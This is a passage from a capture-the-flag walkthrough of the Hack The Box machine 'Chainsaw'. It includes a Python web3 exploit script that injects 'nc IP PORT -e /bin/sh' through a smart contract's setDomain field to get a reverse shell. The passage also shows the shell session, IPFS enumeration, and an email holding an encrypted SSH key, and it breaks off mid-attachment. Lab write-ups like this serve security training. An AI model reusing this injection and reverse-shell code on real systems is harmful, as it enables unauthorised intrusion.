class="line">print(YELLOW + <span class="string">"[+] Creating the contract representation"</span>)</span><br><span class="line">print(YELLOW + <span class="string">"[+] Address: &#123;&#125;"</span>.format(address))</span><br><span class="line">abi = json.loads(<span class="string">'[&#123;"constant":true,"inputs":[],"name":"getDomain","outputs":[&#123;"name":"","type": "string"&#125;],"payable":false,"stateMutability":"view","type":"function"&#125;,&#123;"constant":false,"inputs":[&#123;"name":"_value","type":"string"&#125;],"name":"setDomain","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"&#125;]'</span>)</span><br><span class="line">contract = w3.eth.contract(address=address, abi=abi)</span><br><span class="line">print(GREEN + <span class="string">"[*] Done"</span>)</span><br><span class="line">print(YELLOW + <span class="string">"[+] Injecting Reverse Shell:"</span>)</span><br><span class="line">print(YELLOW + <span class="string">"  [!] IP: &#123;&#125;"</span>.format(ip))</span><br><span class="line">print(YELLOW + <span class="string">"  [!] PORT: &#123;&#125;"</span>.format(port))</span><br><span class="line">contract.functions.setDomain(<span class="string">"pwn3d;nc &#123;&#125; &#123;&#125; -e /bin/sh"</span>.format(ip,port)).transact()</span><br><span class="line">print(GREEN + <span class="string">"[*] Domain Changed Successfully, New Value: "</span> + contract.functions.getDomain().call())</span><br><span class="line">print(GREEN + <span class="string">"[*] Now wait for your reverse shell, Exiting..."</span>)</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) != <span class="number">4</span> <span class="keyword">or</span> argv[<span class="number">1</span>] == <span class="string">"-h"</span>:</span><br><span class="line">print(YELLOW + <span class="string">"[!] Usage: &#123;&#125; [contract address] [ip] [port]"</span>.format(argv[<span class="number">0</span>]))</span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">address = argv[<span class="number">1</span>]</span><br><span class="line">ip = argv[<span class="number">2</span>]</span><br><span class="line">port = argv[<span class="number">3</span>]</span><br><span class="line">exploit(address, ip, port)</span><br></pre></td></tr></table></figure><p>I listened on port 1337 and ran the exploit:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# .&#x2F;exploit.py 0x479C21df57F2deaB052C466E4de7E82539F6A988 10.10.xx.xx 1337</span><br><span class="line">[+] Starting</span><br><span class="line">[+] Connecting to chainsaw.htb:9810</span><br><span class="line">[*] Connection Established</span><br><span class="line">[+] Creating the contract representation</span><br><span class="line">[+] Address: 0x479C21df57F2deaB052C466E4de7E82539F6A988</span><br><span class="line">[*] Done</span><br><span class="line">[+] Injecting Reverse Shell:</span><br><span class="line">  [!] IP: 10.10.xx.xx</span><br><span class="line">  [!] PORT: 1337</span><br><span class="line">[*] Domain Changed Successfully, New Value: pwn3d;nc 10.10.xx.xx 1337 -e &#x2F;bin&#x2F;sh</span><br><span class="line">[*] Now wait for your reverse shell, Exiting...</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure><p>And I got a shell immediately as a user called <code>administrator</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# nc -lvnp 1337</span><br><span class="line">Ncat: Version 7.70 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )</span><br><span class="line">Ncat: Listening on :::1337</span><br><span class="line">Ncat: Listening on 0.0.0.0:1337</span><br><span class="line">Ncat: Connection from 10.10.10.142.</span><br><span class="line">Ncat: Connection from 10.10.10.142:49262.</span><br><span class="line">whoami</span><br><span class="line">administrator</span><br><span class="line">which python</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">administrator@chainsaw:&#x2F;opt&#x2F;WeaponizedPing$ ^Z</span><br><span class="line">[1]+  Stopped                 nc -lvnp 1337</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# stty raw -echo</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# nc -lvnp 1337</span><br><span class="line"></span><br><span class="line">administrator@chainsaw:&#x2F;opt&#x2F;WeaponizedPing$ export TERM&#x3D;screen</span><br><span class="line">administrator@chainsaw:&#x2F;opt&#x2F;WeaponizedPing$</span><br></pre></td></tr></table></figure><h2 id="ipfs-–-gt-SSH-as-bobby-–-gt-User-Flag"><a href="#ipfs-–-gt-SSH-as-bobby-–-gt-User-Flag" class="headerlink" title="ipfs –&gt; SSH as bobby –&gt; User Flag"></a>ipfs –&gt; SSH as bobby –&gt; User Flag</h2><p>There were 2 users on the box, <code>administrator</code> and <code>bobby</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">administrator@chainsaw:&#x2F;opt&#x2F;WeaponizedPing$ cd &#x2F;home</span><br><span class="line">administrator@chainsaw:&#x2F;home$ ls -al</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x  4 root          root          4096 Dec 12  2018 .</span><br><span class="line">drwxr-xr-x 25 root          root          4096 Dec 20  2018 ..</span><br><span class="line">drwxr-x---  8 administrator administrator 4096 Dec 20  2018 administrator</span><br><span class="line">drwxr-x---  9 bobby         bobby         4096 Jan 23  2019 bobby</span><br><span class="line">administrator@chainsaw:&#x2F;home$</span><br></pre></td></tr></table></figure><p><code>administrator</code> had no permission to access <code>bobby</code>‘s home directory:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">administrator@chainsaw:&#x2F;home$ cd bobby&#x2F;</span><br><span class="line">bash: cd: bobby&#x2F;: Permission denied</span><br><span class="line">administrator@chainsaw:&#x2F;home$</span><br></pre></td></tr></table></figure><p>In <code>administrator</code>‘s home directory I noticed a directory called <code>.ipfs</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">administrator@chainsaw:&#x2F;home$ cd administrator&#x2F;</span><br><span class="line">administrator@chainsaw:&#x2F;home&#x2F;administrator$ ls -la</span><br><span class="line">total 104</span><br><span class="line">drwxr-x--- 8 administrator administrator  4096 Dec 20  2018 .</span><br><span class="line">drwxr-xr-x 4 root          root           4096 Dec 12  2018 ..</span><br><span class="line">lrwxrwxrwx 1 administrator administrator     9 Dec 12  2018 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r----- 1 administrator administrator   220 Dec 12  2018 .bash_logout</span><br><span class="line">-rw-r----- 1 administrator administrator  3771 Dec 12  2018 .bashrc</span><br><span class="line">-rw-r----- 1 administrator administrator   220 Dec 20  2018 chainsaw-emp.csv</span><br><span class="line">drwxrwxr-x 5 administrator administrator  4096 Jan 23  2019 .ipfs</span><br><span class="line">drwxr-x--- 3 administrator administrator  4096 Dec 12  2018 .local</span><br><span class="line">drwxr-x--- 3 administrator administrator  4096 Dec 13  2018 maintain</span><br><span class="line">drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .ngrok2</span><br><span class="line">-rw-r----- 1 administrator administrator   807 Dec 12  2018 .profile</span><br><span class="line">drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .ssh</span><br><span class="line">drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .swt</span><br><span class="line">-rw-r----- 1 administrator administrator  1739 Dec 12  2018 .tmux.conf</span><br><span class="line">-rw-r----- 1 administrator administrator 45152 Dec 12  2018 .zcompdump</span><br><span class="line">lrwxrwxrwx 1 administrator administrator     9 Dec 12  2018 .zsh_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r----- 1 administrator administrator  1295 Dec 12  2018 .zshrc</span><br><span class="line">administrator@chainsaw:&#x2F;home&#x2F;administrator$</span><br></pre></td></tr></table></figure><blockquote><p>The InterPlanetary File System (IPFS) is a <a href="https://en.wikipedia.org/wiki/Communications_protocol" target="_blank" rel="noopener">protocol</a> and <a href="https://en.wikipedia.org/wiki/Peer-to-peer" target="_blank" rel="noopener">peer-to-peer</a> network for storing and sharing data in a <a href="https://en.wikipedia.org/wiki/Distributed_file_system" target="_blank" rel="noopener">distributed file system</a>. IPFS uses <a href="https://en.wikipedia.org/wiki/Content-addressable_storage" target="_blank" rel="noopener">content-addressing</a> to uniquely identify each file in a <a href="https://en.wikipedia.org/wiki/Global_Namespace" target="_blank" rel="noopener">global namespace</a> connecting all computing devices. -<a href="https://en.wikipedia.org/wiki/InterPlanetary_File_System" target="_blank" rel="noopener">Wikipedia</a></p></blockquote><p>Take a look at the <a href="https://docs.ipfs.io/reference/api/cli/" target="_blank" rel="noopener">cli documentation</a>.<br>I used <code>ip refs local</code> to list the local references:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">administrator@chainsaw:&#x2F;home&#x2F;administrator$ ipfs refs local</span><br><span class="line">QmYCvbfNbCwFR45HiNP45rwJgvatpiW38D961L5qAhUM5Y</span><br><span class="line">QmPctBY8tq2TpPufHuQUbe2sCxoy2wD5YRB6kdce35ZwAx</span><br><span class="line">QmbwWcNc7TZBUDFzwW7eUTAyLE2hhwhHiTXqempi1CgUwB</span><br><span class="line">QmdL9t1YP99v4a2wyXFYAQJtbD9zKnPrugFLQWXBXb82sn</span><br><span class="line">QmSKboVigcD3AY4kLsob117KJcMHvMUu6vNFqk1PQzYUpp</span><br><span class="line">QmUHHbX4N8tUNyXFK9jNfgpFFddGgpn72CF1JyNnZNeVVn</span><br><span class="line">QmegE6RZe59xf1TyDdhhcNnMrsevsfuJHUynLuRc4yf6V1</span><br><span class="line">QmWSLAHhiNVRMFMv4bnE7fqq9E74RtXTRm9E1QVo37GV9t</span><br><span class="line">QmPjsarLFBcY8seiv3rpUZ2aTyauPF3Xu3kQm56iD6mdcq</span><br><span class="line">QmZrd1ik8Z2F5iSZPDA2cZSmaZkHFEE4jZ3MiQTDKHAiri</span><br><span class="line">QmdfTbBqBPQ7VNxZEYEj14VmRuZBkqFbiwReogJgS1zR1n</span><br><span class="line">QmfRZWFfaugHeY5gcgNDrnRkxhPT3epmHodryPYK3it6kk</span><br><span class="line">QmZTR5bcpQD7cFgTorqxZDYaew1Wqgfbd2ud9QqGPAkK2V</span><br><span class="line">QmejvEPop4D7YUadeGqYWmZxHhLc4JBUCzJJHWMzdcMe2y</span><br><span class="line">QmbkQxbErC7KSWzSQw2FC13LUm9Rbo2XjeFQZbcmdarpuz</span><br><span class="line">QmPpsT37SpTbZkAeMz7LXiJ8nQseBNziGBzpW1YtM67qx6</span><br><span class="line">QmXWS8VFBxJPsxhF8KEqN1VpZf52DPhLswcXpxEDzF5DWC</span><br><span class="line">QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF</span><br><span class="line">QmZxzK6gXioAUH9a68ojwkos8EaeANnicBJNA3TND4Sizp</span><br><span class="line">Qmb7oGTxge7amSArtJsGUAqswY8y1G7m5QNjV57Nj5sEHU</span><br><span class="line">QmS4ustL54uo8FzR9455qaxZwuMiUhyvMcX9Ba8nUH4uVv</span><br><span class="line">QmXymZCHdTHz5BA5ugv9MQTBtQAb6Vit4iFeEnuRj6Udrh</span><br><span class="line">QmUNLLsPACCz1vLxQVkXqqLX5R1X345qqfHbsf67hvA3Nn</span><br><span class="line">Qma6kDKzUzFioo62v4LZaNsrwmCojF9AqwLaQJubRFnsAa</span><br><span class="line">QmXwXzVYKgYZEXU1dgCKeejT87Knw9nydGcuUZrjwNb2Me</span><br><span class="line">QmXgqKTbzdh83pQtKFb19SpMCpDDcKR2ujqk3pKph9aCNF</span><br><span class="line">QmYn3NxLLYA6xU2XL1QJfCZec4B7MpFNxVVtDvqbiZCFG8</span><br><span class="line">QmWMuEvh2tGJ1DiNPPoN6rXme2jMYUixjxsC6QUji8mop8</span><br><span class="line">QmY5heUM5qgRubMDD1og9fhCPA6QdkMp3QCwd4s7gJsyE7</span><br><span class="line">QmQ5vhrL7uv6tuoN9KeVBwd4PwfQkXdVVmDLUZuTNxqgvm</span><br><span class="line">QmZMUdskS6vK8ycBiAffrYAE4wUDuWX9eK7kNgQqPCGbwF</span><br><span class="line">QmPC3ZbrMeZ8BpstpNseNV4fCRL4QDzUKrSv8EHkarbn7r</span><br><span class="line">QmPhk6cJkRcFfZCdYam4c9MKYjFG9V29LswUnbrFNhtk2S</span><br><span class="line">QmSyJKw6U6NaXupYqMLbEbpCdsaYR5qiNGRHjLKcmZV17r</span><br><span class="line">QmZZRTyhDpL5Jgift1cHbAhexeE1m2Hw8x8g7rTcPahDvo</span><br><span class="line">QmUH2FceqvTSAvn6oqm8M49TNDqowktkEx4LgpBx746HRS</span><br><span class="line">QmcMCDdN1qDaa2vaN654nA4Jzr6Zv9yGSBjKPk26iFJJ4M</span><br><span class="line">QmPZ9gcCEpqKTo6aq61g2nXGUhM4iCL3ewB6LDXZCtioEB</span><br><span class="line">Qmc7rLAhEh17UpguAsEyS4yfmAbeqSeSEz4mZZRNcW52vV</span><br><span class="line">administrator@chainsaw:&#x2F;home&#x2F;administrator$</span><br></pre></td></tr></table></figure><p>I used <code>ipfs ls</code> on every hash to list the contents, most of them were empty or useless except for this one which had some email messages:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">administrator@chainsaw:&#x2F;home&#x2F;administrator$ ipfs ls QmZrd1ik8Z2F5iSZPDA2cZSmaZkHFEE4jZ3MiQTDKHAiri</span><br><span class="line">QmbwWcNc7TZBUDFzwW7eUTAyLE2hhwhHiTXqempi1CgUwB 10063 artichain600-protonmail-2018-12-13T20_50_58+01_00.eml            </span><br><span class="line">QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF 4640  bobbyaxelrod600-protonmail-2018-12-13-T20_28_54+01_00.eml    </span><br><span class="line">QmZxzK6gXioAUH9a68ojwkos8EaeANnicBJNA3TND4Sizp 10084 bryanconnerty600-protonmail-2018-12-13T20_50_36+01_00.eml      </span><br><span class="line">QmegE6RZe59xf1TyDdhhcNnMrsevsfuJHUynLuRc4yf6V1 10083 laraaxelrod600-protonmail-2018-12-13T20_49_35+01_00.eml                             </span><br><span class="line">QmXwXzVYKgYZEXU1dgCKeejT87Knw9nydGcuUZrjwNb2Me 10092 wendyrhoades600-protonmail-2018-12-13T20_50_15+01_00.eml</span><br><span class="line">administrator@chainsaw:&#x2F;home&#x2F;administrator$</span><br></pre></td></tr></table></figure><p>We’re interested in <code>bobby</code>‘s file so I used <code>ipfs get</code> to get it:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">administrator@chainsaw:&#x2F;home&#x2F;administrator$ ipfs get QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF</span><br><span class="line">Saving file(s) to QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF</span><br><span class="line"> 4.53 KiB &#x2F; 4.53 KiB  100.00% 0s</span><br><span class="line">administrator@chainsaw:&#x2F;home&#x2F;administrator$ ls -al</span><br><span class="line">total 112</span><br><span class="line">drwxr-x--- 8 administrator administrator  4096 Nov 22 19:50 .</span><br><span class="line">drwxr-xr-x 4 root          root           4096 Dec 12  2018 ..</span><br><span class="line">lrwxrwxrwx 1 administrator administrator     9 Dec 12  2018 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r----- 1 administrator administrator   220 Dec 12  2018 .bash_logout</span><br><span class="line">-rw-r----- 1 administrator administrator  3771 Dec 12  2018 .bashrc</span><br><span class="line">-rw-r----- 1 administrator administrator   220 Dec 20  2018 chainsaw-emp.csv</span><br><span class="line">drwxrwxr-x 5 administrator administrator  4096 Nov 22 19:50 .ipfs</span><br><span class="line">drwxr-x--- 3 administrator administrator  4096 Dec 12  2018 .local</span><br><span class="line">drwxr-x--- 3 administrator administrator  4096 Dec 13  2018 maintain</span><br><span class="line">drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .ngrok2</span><br><span class="line">-rw-r----- 1 administrator administrator   807 Dec 12  2018 .profile</span><br><span class="line">-rw-r--r-- 1 administrator administrator  4629 Nov 22 19:50 QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF              </span><br><span class="line">drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .ssh</span><br><span class="line">drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .swt</span><br><span class="line">-rw-r----- 1 administrator administrator  1739 Dec 12  2018 .tmux.conf</span><br><span class="line">-rw-r----- 1 administrator administrator 45152 Dec 12  2018 .zcompdump</span><br><span class="line">lrwxrwxrwx 1 administrator administrator     9 Dec 12  2018 .zsh_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r----- 1 administrator administrator  1295 Dec 12  2018 .zshrc</span><br><span class="line">administrator@chainsaw:&#x2F;home&#x2F;administrator$</span><br></pre></td></tr></table></figure><p>The email had his encrypted <code>ssh</code> key as an attachment:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">administrator@chainsaw:&#x2F;home&#x2F;administrator$ cat QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF</span><br><span class="line">X-Pm-Origin: internal</span><br><span class="line">X-Pm-Content-Encryption: end-to-end</span><br><span class="line">Subject: Ubuntu Server Private RSA Key</span><br><span class="line">From: IT Department &lt;chainsaw_admin@protonmail.ch&gt;</span><br><span class="line">Date: Thu, 13 Dec 2018 19:28:54 +0000      </span><br><span class="line">Mime-Version: 1.0</span><br><span class="line">Content-Type: multipart&#x2F;mixed;boundary&#x3D;---------------------d296272d7cb599bff2a1ddf6d6374d93</span><br><span class="line">To: bobbyaxelrod600@protonmail.ch &lt;bobbyaxelrod600@protonmail.ch&gt;</span><br><span class="line">X-Attached: bobby.key.enc</span><br><span class="line">Message-Id: &lt;zctvLwVo5mWy8NaBt3CLKmxVckb-cX7OCfxUYfHsU2af1NH4krcpgGz7h-PorsytjrT3sA9Ju8WNuWaRAnbE0CY0nIk2WmuwOvOnmRhHPoU&#x3D;@protonmail.ch&gt;</span><br><span class="line">Received: from mail.protonmail.ch by mail.protonmail.ch; Thu, 13 Dec 2018 14:28:58 -0500</span><br><span class="line">X-Original-To: bobbyaxelrod600@protonmail.ch</span><br><span class="line">Return-Path: &lt;chainsaw_admin@protonmail.ch&gt;</span><br><span class="line">Delivered-To: bobbyaxelrod600@protonmail.ch</span><br><span class="line">-----------------------d296272d7cb599bff2a1ddf6d6374d93</span><br><span class="line">Content-Type: multipart&#x2F;related;boundary&#x3D;---------------------ffced83f318ffbd54e80374f045d2451                        </span><br><span class="line">-----------------------ffced83f318ffbd54e80374f045d2451</span><br><span class="line">Content-Type: text&#x2F;html;charset&#x3D;utf-8</span><br><span class="line">Content-Transfer-Encoding: base64</span><br><span class="line"></span><br><span class="line">PGRpdj5Cb2JieSw8YnI+PC9kaXY+PGRpdj48YnI+PC9kaXY+PGRpdj5JIGFtIHdyaXRpbmcgdGhp</span><br><span class="line">cyBlbWFpbCBpbiByZWZlcmVuY2UgdG8gdGhlIG1ldGhvZCBvbiBob3cgd2UgYWNjZXNzIG91ciBM</span><br><span class="line">aW51eCBzZXJ2ZXIgZnJvbSBub3cgb24uIER1ZSB0byBzZWN1cml0eSByZWFzb25zLCB3ZSBoYXZl</span><br><span class="line">IGRpc2FibGVkIFNTSCBwYXNzd29yZCBhdXRoZW50aWNhdGlvbiBhbmQgaW5zdGVhZCB3ZSB3aWxs</span><br><span class="line">IHVzZSBwcml2YXRlL3B1YmxpYyBrZXkgcGFpcnMgdG8gc2VjdXJlbHkgYW5kIGNvbnZlbmllbnRs</span><br><span class="line">eSBhY2Nlc3MgdGhlIG1hY2hpbmUuPGJyPjwvZGl2PjxkaXY+PGJyPjwvZGl2PjxkaXY+QXR0YWNo</span><br><span class="line">ZWQgeW91IHdpbGwgZmluZCB5b3VyIHBlcnNvbmFsIGVuY3J5cHRlZCBwcml2YXRlIGtleS4gUGxl</span><br><span class="line">YXNlIGFzayZuYnNwO3JlY2VwdGlvbiBkZXNrIGZvciB5b3VyIHBhc3N3b3JkLCB0aGVyZWZvcmUg</span><br><span class="line">YmUgc3VyZSB0byBicmluZyB5b3VyIHZhbGlkIElEIGFzIGFsd2F5cy48YnI+PC9kaXY+PGRpdj48</span><br><span class="line">YnI+PC9kaXY+PGRpdj5TaW5jZXJlbHksPGJyPjwvZGl2PjxkaXY+SVQgQWRtaW5pc3RyYXRpb24g</span><br><span class="line">RGVwYXJ0bWVudDxicj48L2Rpdj4&#x3D;</span><br><span class="line">-----------------------ffced83f318ffbd54e80374f045d2451--</span><br><span class="line">-----------------------d296272d7cb599bff2a1ddf6d6374d93</span><br><span class="line">Content-Type: application&#x2F;octet-stream; filename&#x3D;&quot;bobby.key.enc&quot;; name&#x3D;&quot;bobby.key.enc&quot;</span><br><span class="line">Content-Transfer-Encoding: base64</span><br><span class="line">Content-Disposition: attachment; filename&#x3D;&quot;bobby.key.enc&quot;; name&#x3D;&quot;bobby.key.enc&quot;</span><br><span class="line"></span><br><span class="line">LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRF</span><br><span class="line">Sy1JbmZvOiBERVMtRURFMy1DQkMsNTNEODgxRjI5OUJBODUwMwoKU2VDTll3L0JzWFB5UXExSFJM</span><br><span class="line">RUVLaGlOSVZmdFphZ3pPY2M2NGZmMUlwSm85SWVHN1ovemordjFkQ0lkZWp1awo3a3RRRmN6VGx0</span><br><span class="line">dG5ySWo2bWRCYjZybk42Q3NQMHZiejlOelJCeWcxbzZjU0dkckwyRW1KTi9lU3hENEFXTGN6Cm4z</span><br><span class="line">MkZQWTBWamxJVnJoNHJqaFJlMndQTm9nQWNpQ0htWkdFQjB0Z3YyL2V5eEU2M1ZjUnpyeEpDWWwr</span><br><span class="line">aHZTWjYKZnZzU1g4QTRRcjdyYmY5Zm56NFBJbUlndXJGM1ZoUW1kbEVtekRSVDRtL3BxZjNUbUdB</span><br><span class="line">azkrd3JpcW5rT0RGUQpJKzJJMWNQYjhKUmhMU3ozcHlCM1gvdUdPVG5ZcDRhRXErQVFaMnZFSnoz</span><br><span class="line">RmZYOVNYOWs3ZGQ2S2FadFNBenFpCnc5ODFFUzg1RGs5TlVvOHVMeG5aQXczc0Y3UHo0RXVKMEhw</span><br><span class="line">bzFlWmdZdEt6dkRLcnJ3OHVvNFJDYWR4N0tIUlQKaW5LWGR1SHpuR0ExUVJPelpXN3hFM0hFTDN2</span><br><span class="line">eFI5Z01WOGdKUkhEWkRNSTl4bHc5OVFWd2N4UGNGYTMxQXpWMgp5cDNxN3lsOTU0U0NNT3RpNFJD</span><br><span class="line">M1o0eVVUakRrSGRIUW9FY0dpZUZPV1UraTFvaWo0Y3J4MUxiTzJMdDhuSEs2CkcxQ2NxN2lPb240</span><br><span class="line">UnNUUmxWcnY4bGlJR3J4bmhPWTI5NWU5ZHJsN0JYUHBKcmJ3c284eHhIbFQzMzMzWVU5ZGoKaFFM</span><br><span class="line">TnA1KzJINCtpNm1tVTN0Mm9nVG9QNHNrVmNvcURsQ0MrajZoRE9sNGJwRDl0NlRJSnVyV3htcEdn</span><br><span class="line">TnhlcwpxOE5zQWVudGJzRCt4bDRXNnE1bXVMSlFtai94UXJySGFjRVpER0k4a1d2WkUxaUZtVmtE</span><br><span class="line">L3hCUm53b0daNWh0CkR5aWxMUHBsOVIrRGg3YnkzbFBtOGtmOHRRbkhzcXBSSGNleUJGRnBucTBB</span><br><span class="line">VWRFS2ttMUxSTUxBUFlJTGJsS0cKandyQ3FSdkJLUk1JbDZ0SmlEODdOTTZKQm9ReWRPRWNwbis2</span><br><span class="line">RFUrMkFjdGVqYnVyMGFNNzRJeWVlbnJHS1NTWgpJWk1zZDJrVFNHVXh5OW8veFBLRGtVdy9TRlV5</span><br><span class="line">U21td2lxaUZMNlBhRGd4V1F3SHh0eHZtSE1oTDZjaXROZEl3ClRjT1RTSmN6bVIycEp4a29oTHJI</span><br><span class="line">N1lyUzJhbEtzTTBGcEZ3bWR6MS9YRFNGMkQ3aWJmL1cxbUF4TDVVbUVxTzAKaFVJdVcxZFJGd0hq</span><br><span class="line">TnZhb1NrK2ZyQXA2aWM2SVBZU21kbzhHWVl5OHBYdmNxd2ZScHhZbEFDWnU0RmlpNmhZaQo0V3Bo</span><br><span class="line">VDNaRllEcnc3U3RnSzA0a2JEN1FrUGVOcTlFdjFJbjJuVmR6RkhQSWg2eitmbXBiZ2ZXZ2VsTEhj</span><br><span class="line">MmV0ClNKWTQrNUNFYmtBY1lFVW5QV1k5U1BPSjdxZVU3K2IvZXF6aEtia3BuYmxtaUsxZjNyZU9N</span><br><span class="line">MllVS3k4YWFsZWgKbkpZbWttcjN0M3FHUnpoQUVUY2tjOEhMRTExZEdFK2w0YmE2V0JOdTE1R29F</span><br><span 